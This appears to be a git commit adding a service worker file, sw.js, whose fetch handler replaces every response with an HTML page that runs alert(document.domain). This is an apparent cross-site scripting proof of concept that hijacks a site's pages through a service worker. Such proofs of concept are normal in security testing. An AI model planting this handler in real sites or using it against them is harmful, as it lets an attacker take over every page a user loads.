979b0970148e635e20b11f15cd60560ebadd976f
hanixww <141064548+hanixww@users.noreply.github.com>
2025-09-04 10:20:59 +0330

    sw.js

--- sw.js
+++ sw.js
@@ -1,1 +1,8 @@
-javascript:
+// sw.js
+self.addEventListener("fetch", e => {
+  e.respondWith(
+    new Response(`<script>alert(document.domain)</script>`, {
+      headers: { "Content-Type": "text/html" }
+    })
+  );
+});
